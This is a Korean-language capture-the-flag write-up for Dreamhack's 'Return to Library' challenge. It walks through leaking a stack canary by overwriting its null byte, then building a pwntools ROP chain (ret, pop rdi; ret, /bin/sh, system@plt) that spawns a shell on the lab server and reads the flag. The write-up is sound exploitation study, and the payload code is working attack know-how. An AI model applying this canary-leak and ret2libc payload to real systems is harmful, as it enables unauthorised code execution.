# Dreamhack 353 - Return to Library

## 1. 문제 요약

Dreamhack 353번 `Return to Library`는 BOF(Buffer Overflow)를 이용해 return address를 덮고, 바이너리 안에 존재하는 `system` 함수와 `/bin/sh` 문자열을 재사용하여 쉘을 획득하는 문제다.

일반적인 shellcode 삽입 방식이 아니라, NX 보호 기법이 켜져 있으므로 스택에 코드를 넣고 실행할 수 없다.  
따라서 이미 바이너리에 존재하는 함수와 문자열을 이용하는 Return to Library, 즉 ret2libc/ret2plt 방식으로 접근해야 한다.

---

## 2. 핵심 개념

- BOF(Buffer Overflow)
- Stack Canary
- Canary Leak
- Return Address Overwrite
- ROP(Return Oriented Programming)
- `pop rdi; ret` gadget
- x86-64 Linux Calling Convention
- Return to Library / ret2libc
- `system("/bin/sh")`

---

## 3. 보호 기법 확인

`checksec` 결과 다음과 같은 보호 기법이 확인되었다.

- Canary: Enabled
- NX: Enabled
- PIE: Disabled
- RELRO: Partial

여기서 중요한 점은 다음과 같다.

- Canary가 있으므로 단순히 return address를 덮으면 프로그램이 종료된다.
- NX가 켜져 있으므로 스택에 shellcode를 넣어 실행하는 방식은 사용할 수 없다.
- PIE가 꺼져 있으므로 바이너리 내부 주소는 고정되어 있어 ROP에 필요한 주소를 쉽게 사용할 수 있다.

---

## 4. 문제 분석

`main` 함수를 분석한 결과, 스택에 `0x40` 바이트 크기의 공간을 만들고 그 안에서 입력 버퍼와 canary를 사용하는 구조였다.

중요한 어셈블리 흐름은 다음과 같았다.

```asm
sub rsp, 0x40
mov rax, QWORD PTR fs:0x28
mov QWORD PTR [rbp-0x8], rax
```

이를 통해 canary가 `[rbp-0x8]` 위치에 저장된다는 것을 알 수 있었다.

또한 입력 버퍼는 `[rbp-0x40]`부터 시작한다.

따라서 버퍼 시작부터 canary 직전까지의 거리는 다음과 같다.

```text
(rbp - 0x8) - (rbp - 0x40) = 0x38
```

즉, payload에서 canary 직전까지 채우기 위해 필요한 padding은 `0x38` 바이트다.

---

## 5. Canary Leak

처음에는 canary를 모르면 return address를 덮을 수 없다고 생각했다.  
하지만 이 문제는 입력받은 버퍼를 다시 출력해주는 구조가 있어서 canary leak이 가능했다.

x86-64 Linux의 stack canary는 일반적으로 첫 바이트가 `\x00`이다.  
문자열 출력 함수는 `\x00`을 만나면 출력을 멈추기 때문에 원래는 canary가 출력되지 않는다.

하지만 `0x38` 바이트를 채운 뒤 canary의 첫 바이트까지 1바이트 더 덮으면, 즉 총 `0x39` 바이트를 입력하면 canary의 첫 null byte가 덮인다.

```python
payload = b"A" * 0x39
```

이렇게 하면 원래 출력이 멈춰야 할 `\x00`이 사라져서 canary의 뒤쪽 7바이트가 출력된다.

그 후 leak된 7바이트 앞에 원래 canary의 첫 바이트인 `\x00`을 붙여 canary를 복구한다.

```python
canary = u64(b"\x00" + leaked_7bytes)
```

처음에는 “canary가 있으면 못 뚫는 것 아닌가?”라고 생각했지만, canary 자체가 안전한 것이 아니라 canary 값이 노출되지 않아야 안전하다는 점을 이해했다.

---

## 6. Return Address Overwrite

canary를 알아낸 뒤에는 두 번째 입력에서 BOF를 이용해 return address를 덮는다.

최종 payload 구조는 다음과 같다.

```text
"A" * 0x38
canary
"B" * 8
ROP chain
```

여기서 `B * 8`은 saved RBP 자리다.  
공격의 목적은 saved RBP를 조작하는 것이 아니라 return address까지 도달하는 것이므로, saved RBP는 단순 padding으로 채운다.

즉 구조는 다음과 같다.

```text
[ buffer      ]  A * 0x38
[ canary      ]  leaked canary
[ saved rbp   ]  B * 8
[ return addr ]  ROP chain 시작
```

---

## 7. 왜 `pop rdi; ret`가 필요한가

처음에는 return address에 바로 `system` 주소와 `/bin/sh` 주소를 넣으면 될 것 같다고 생각했다.

하지만 이 문제는 64비트 Linux 바이너리다.  
x86-64 Linux 호출 규약에서는 함수의 첫 번째 인자를 스택이 아니라 `rdi` 레지스터로 전달한다.

따라서 `system("/bin/sh")`를 실행하려면 다음 상태를 만들어야 한다.

```text
rdi = "/bin/sh" 주소
rip = system 주소
```

이를 위해 `pop rdi; ret` gadget을 사용한다.

```text
pop rdi; ret
```

이 gadget은 스택 맨 위 값을 꺼내 `rdi`에 넣고, 그 다음 `ret`로 다음 주소로 이동한다.

payload에 다음과 같이 배치하면:

```text
pop rdi; ret 주소
/bin/sh 주소
system 주소
```

실행 흐름은 다음과 같이 된다.

```text
1. ret → pop rdi; ret 주소로 이동
2. pop rdi → 스택의 /bin/sh 주소를 rdi에 저장
3. ret → system 주소로 이동
4. system("/bin/sh") 실행
```

즉 `pop rdi; ret`는 목적지가 아니라, `system` 함수에 인자를 전달하기 위한 준비 과정이다.

---

## 8. 필요한 주소 찾기

pwntools의 `ELF` 객체를 사용하면 바이너리 안의 주소를 쉽게 찾을 수 있다.

```python
elf = ELF("./rtl")

system = elf.plt["system"]
binsh = next(elf.search(b"/bin/sh"))

rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address
```

- `system`: `system@plt` 주소
- `binsh`: 바이너리 안의 `/bin/sh` 문자열 주소
- `pop_rdi_ret`: `rdi`에 `/bin/sh` 주소를 넣기 위한 gadget
- `ret`: stack alignment를 맞추기 위한 단순 `ret` gadget

주소는 정수값이지만, 사람이 보기 쉽게 `hex()`로 출력했다.

---

## 9. Exploit 전략

전체 exploit 흐름은 다음과 같다.

1. 첫 번째 입력에서 `A * 0x39`를 보내 canary의 뒤 7바이트를 leak한다.
2. leak된 값 앞에 `\x00`을 붙여 canary를 복구한다.
3. 두 번째 입력에서 canary를 원래 값으로 넣어 stack canary 검사를 통과한다.
4. saved RBP는 padding으로 덮는다.
5. return address를 ROP chain으로 덮는다.
6. `pop rdi; ret`를 통해 `/bin/sh` 주소를 `rdi`에 넣는다.
7. `system`으로 이동하여 `system("/bin/sh")`를 실행한다.
8. 쉘을 획득한 뒤 remote 서버에서 `cat flag`로 flag를 확인한다.

---

## 10. Payload 구조

최종 payload는 다음과 같은 형태다.

```python
payload  = b"A" * 0x38
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)
```

각 부분의 의미는 다음과 같다.

```text
A * 0x38        → canary 직전까지 채움
canary          → canary 검사 통과
B * 8           → saved RBP padding
ret             → stack alignment
pop rdi; ret    → rdi에 다음 값 넣기
/bin/sh 주소    → system의 첫 번째 인자
system 주소     → system("/bin/sh") 실행
```

---

## 11. 로컬과 원격 실행

로컬에서는 exploit이 성공하면 `$` 프롬프트가 뜨는 것을 확인할 수 있었다.  
하지만 실제 flag는 로컬 파일에 있는 것이 아니라 Dreamhack remote 서버에 존재한다.

따라서 로컬에서 exploit 동작을 확인한 뒤, Dreamhack에서 제공한 host와 port를 이용해 remote로 실행해야 한다.

```bash
python3 solve.py host8.dreamhack.games 11866
```

쉘이 뜨면 다음 명령으로 flag를 확인한다.

```bash
ls
cat flag
```

---

## 12. 배운 점

이번 문제를 풀면서 BOF가 단순히 return address를 덮는 것만이 아니라, 보호 기법을 우회하는 과정까지 포함한다는 것을 이해했다.

특히 stack canary가 있으면 무조건 공격이 불가능한 것이 아니라, canary leak이 가능하면 원래 값을 payload에 다시 넣어 검사를 통과할 수 있다는 점을 배웠다.

또한 32비트와 64비트의 함수 호출 규약 차이를 이해했다.  
32비트에서는 함수 인자를 스택으로 넘기기 때문에 `system`, return address, `/bin/sh` 순서로 payload를 구성할 수 있지만, 64비트 Linux에서는 첫 번째 인자를 `rdi` 레지스터로 넘기므로 `pop rdi; ret` gadget이 필요하다.

처음에는 payload에 `system`과 `/bin/sh` 주소를 바로 넣으면 될 것 같다고 생각했지만, 64비트에서는 `/bin/sh` 주소가 인자로 처리되는 것이 아니라 `system` 이후의 return address처럼 취급된다는 점을 이해했다.

또한 `pop rdi; ret`는 payload에 명령어 자체를 넣는 것이 아니라, 바이너리 어딘가에 이미 존재하는 gadget의 주소를 찾아 return address에 넣는 방식이라는 점을 배웠다.  
즉 ROP는 새로운 코드를 주입하는 것이 아니라, 기존 코드 조각을 재사용해 원하는 실행 흐름을 만드는 기법이다.

마지막으로 로컬 실행과 remote 실행의 차이도 알게 되었다.  
로컬 바이너리는 exploit을 테스트하기 위한 것이고, 실제 flag는 Dreamhack remote 서버에 존재하므로 최종적으로는 remote 연결을 통해 exploit을 수행해야 한다.

---

## 13. 정리

이번 문제의 핵심은 다음과 같다.

```text
BOF 발생
→ canary leak
→ canary 복구
→ saved RBP padding
→ return address overwrite
→ pop rdi; ret
→ rdi = "/bin/sh"
→ system("/bin/sh")
→ shell 획득
→ flag 출력
```

이 문제를 통해 Return to Library 방식의 기본 흐름과, 64비트 ROP에서 함수 인자를 세팅하는 방법을 이해할 수 있었다.
